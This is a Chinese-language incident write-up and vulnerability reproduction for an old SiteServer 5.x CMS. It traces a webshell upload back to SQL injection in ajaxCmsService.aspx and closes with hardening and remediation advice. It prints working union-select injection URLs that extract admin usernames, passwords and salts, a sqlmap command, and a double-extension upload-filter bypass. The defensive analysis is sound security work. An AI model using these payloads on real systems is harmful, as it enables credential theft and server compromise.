## 背景

客户公司有一台比较陈旧的winserver2008，上面跑着陈旧的SiteServer5.0，光是这几年处理被1day攻击，各种传马，小马拖大马应接不暇，隔几个月就要在这个跑马场里陪攻击者们博弈一波，甚是有趣。比如这次深度溯源复现发现疑似在野0day也是让我学到了很多东西。

## review梳理攻击过程及各部分安全设备部署的表现

review过程大致如下：

![1604114213_5f9cd7258d4d821b0f838.jpg!small?1604114213223](https://image.3001.net/images/20201031/1604114213_5f9cd7258d4d821b0f838.jpg!small?1604114213223)

 **HIDS-agent发现webshell**

HIDS非常及时地发现了有恶意文件上传并邮件告警，这个表现给99分。

 **确认系统层面安全**

首先简单确认系统用户,系统进程,计划任务等比较关键的地方没有问题。

 **排查IIS Log找到sql注入攻击入口**

通过web-log查找被传的这个马的访问记录,顺着访问记录往前摸排,最终确定了攻击者的入口是ajaxCmsService.aspx,

我们排查出的攻击者使用的攻击向量如下，这三条payload分别对应获取到服务器的UserName、Password、PasswordSalt:

    
    
    http://www.xxxx.cn/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&publishmentSystemId=1&nodeId=1&title=a%27,0)%20%3E%200%20union%20select%20TOP%202%20Username%20from%20bairong_Administrator--  
    http://www.xxxx.cn/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&publishmentSystemId=1&nodeId=1&title=a%27,0)%20%3E%200%20union%20select%20TOP%201%20Password%20from%20bairong_Administrator--%20  
    http://www.xxxx.cn/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&publishmentSystemId=1&nodeId=1&title=a%27,0)%20%3E%200%20union%20select%20TOP%202%20PasswordSalt%20from%20bairong_Administrator--
到这一步之后，攻击者就已经拿到了网站后台的登录账号及密码，虽然是加密的，但还是有工具可以解开。

 **找到webshell上传点**

根据weblog的排查大马的post包上传记录，找到了后台上传文件接口，上传正常文件，抓包改包，通过双写绕过黑名单过滤，即可成功上传到upload目录下。

![1604114300_5f9cd77c74ab6d5c4f821.png!small?1604114299992](https://image.3001.net/images/20201031/1604114300_5f9cd77c74ab6d5c4f821.png!small?1604114299992)

![1604114358_5f9cd7b6479e19949303b.png!small?1604114358139](https://image.3001.net/images/20201031/1604114358_5f9cd7b6479e19949303b.png!small?1604114358139)

这两步实际上在现有的安全设备发展进展下，完全应该由waf来检测告警，但是很遗憾我们这台服务器前面并没有架设waf，或者接入云waf服务，可以说在应用层面上对攻击没有任何防御能力。

 **触发可写不可执行的安全策略**

这是次典型的通过实战验证了安全策略的有效性，我还是比较兴奋的，一定要记下来。这个CMS老版本来就有很多自动化的1day在各种攻击，我们也是加固过几次，上了一些安全策略，诸如可写目录不可知行，所有访问可写目录下的aspx请求全部重定向去主页等。

上传目录的web.config可做如下限制：

    
    
    <system.webServer>  
    <handlers accessPolicy="Read,Write" />  
    </system.webServer>  
    //除此之外，还有一些攻击手法会找一些自动解压的接口打包上传webshell+web.config，以此来覆盖原有的web.config，突破可执行的限制，这时就要通过目录权限配置来保护web.config的安全。

正因为我们之前上过策略，所以本次webshell是失效的，从log中也能看到访问的请求返回都是403。

## 漏洞复现

每次被攻击后我们都要进行溯源,加固,
该停用的停用,该修复的修复,安全策略更是上了一波又一波,没想到这次又被传马了,一时间我还有点接受不了,毕竟加固了那么多次还出问题,有点面子挂不住,终于下决心来一起看看源码，没想到这一看不得了,还真吓了我一跳。另一方面原因是，以往的攻击手法都其实都是的1day，可以在网上找到各种分析的案例，这次我居然没有搜到，所以更加怀疑了可能是个在野0day。

####  **搭建环境**

虚拟机起陈旧的版本是挺不容易的,在环境折腾这块实际上踩了不少的坑,我就直接把最终成功的版本信息整理一下发出来.

软件版本| 注意的点  
---|---  
WinServer2008_R2_enterprise_and_web_with_sp1| 在多种带SP1的镜像上纠结选择  
.NET Framework| 默认是2.0,要匹配CMS的版本首先安装4.0.然后切到4.5  
IIS默认| 网站目录的解析到SiteServer路径;以及对文件的权限配置  
Mssql2008| 默认安装即可  
SiteServer5.1.15| 5.0版本官方下不到了,5.1是我找到的最接近的版本  
DLL分析软件ILSpy| 最新版  
  
winServer镜像链接:

>
> ed2k://|file|cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_vl_build_x64_dvd_617396.iso|3368962048|7C210CAC37A05F459758BCC1F4478F9E|/
>
> .NET Framework4.0链接: <https://www.microsoft.com/en-> us/download/details.aspx?id=17851>
>
> .NET Framework4.5链接:
> <https://download.microsoft.com/download/E/2/1/E21644B5-2DF2-47C2-91BD-63C560427900/NDP452-KB2901907-x86-x64-AllOS-> ENU.exe>
>
> SiteServer5.1.15链接:
> <https://codeload.github.com/siteserver/cms/zip/siteserver-v5.0.15>

## **ILSpy反编译dll找到拼接sql语句﻿**

打开ajaxCmsService.aspx文件只有简短的一句话，引用继承了一个dll文件

    
    
    <%@ Page language="c#" trace="False" enableViewState="False" Inherits="SiteServer.BackgroundPages.Ajax.AjaxCmsService" %>

用ILSpy文件打开这个dll，反编译分析

![1604115582_5f9cdc7e690d4e8b32ff6.png!small?1604115581958](https://image.3001.net/images/20201031/1604115582_5f9cdc7e690d4e8b32ff6.png!small?1604115581958)![1604115585_5f9cdc811e79a45d6301a.png!small?1604115584595](https://image.3001.net/images/20201031/1604115585_5f9cdc811e79a45d6301a.png!small?1604115584595)

到这里就可以拼语句了，我们直接上payload来手动拼一下

    
    
    type=GetTitles&publishmentSystemId=1&nodeId=1&title=a%27,0)%20%3E%200%20union%20select%20TOP%201%20Password%20from%20bairong_Administrator--%20  //payload
    
    
    GetInstr(ColumName= Title;inStr=a',0) > 0 union select TOP 1 Password from bairong_Administrator-- )  
      
    GetInstr的函数部分如下：

最终语句会拼成如下，简单的union select:

    
    
    inStr = CHARINDEX('a',0) > 0 union select TOP 1 Password from bairong_Administrator-- )', {columnName}) > 0

相应的sqlmap-payload:

    
    
    sqlmap -u "http://198.18.93.154/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&publishmentSystemId=1&nodeId=1&title=a%27,0)%20%3E%200%20"

![1604114499_5f9cd8432f56c94914e1f.png!small?1604114498763](https://image.3001.net/images/20201031/1604114499_5f9cd8432f56c94914e1f.png!small?1604114498763)![](https://image.3001.net/images/20201031/1604114935_5f9cd9f72bdeaac96013d.png!small)

## 影响范围及修复方案

> 攻击者可以获取到该站点siteserver应⽤管理员
>
> 攻击者可以访问到对应的siteserver数据库数据

常规sql注入的修复应考虑使用ORM，或者是预编译语句，避免用户的输入影响到最终数据库里的执行语句。

但在这个古老的版本代码中我们看到了大量的语句直接拼接，大量的接口未授权可直接访问，暂且把它用来学习和测试就好了。我相信在新版中肯定解决了这些很明显的安全问题，但是我们面对的现状就是旧版的上架系统还是有服务正在运行，所以还是要在现有的状况下给出紧急的修复方案，框架性质的漏洞直接修改是比较困难的,涉及的人力成本不亚于升级到新版,所以最紧急的修复措施应该是在中间件上加策略:

> 1\. 停用高危的接口
>
> 2\. 修改admin账户密码
>
> 3\. 暂停后台对公网的开放

反编译了siteserver7.0的dll，已经更换为restful-api开发，且未发现有直接拼接语句的地方。

